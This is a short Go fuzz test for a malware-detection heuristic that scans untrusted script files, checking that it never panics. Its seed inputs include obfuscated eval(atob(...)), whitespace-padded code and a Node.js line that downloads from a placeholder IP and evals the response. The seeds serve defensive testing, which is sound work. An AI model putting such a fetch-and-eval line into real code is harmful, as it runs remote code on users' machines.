package detect

import (
	"strings"
	"testing"
)

// FuzzAnalyzeScript throws arbitrary bytes at the content heuristics. The
// contract is simply that they never panic and always terminate, since they
// run over attacker-controlled files.
func FuzzAnalyzeScript(f *testing.F) {
	seeds := []string{
		"",
		"eval(atob('QQ=='))",
		strings.Repeat("eval(x);", 5000),
		strings.Repeat(" ", 400) + "code()",
		"const r=require('https');r.get('http://1.2.3.4',x=>eval(x))",
		"\x00\x01\x02 not utf8 \xff\xfe",
		strings.Repeat("a", 1<<16),
	}
	for _, s := range seeds {
		f.Add([]byte(s), false)
		f.Add([]byte(s), true)
	}
	f.Fuzz(func(t *testing.T, data []byte, executed bool) {
		_ = analyzeScript("fuzz.js", data, executed)
	})
}
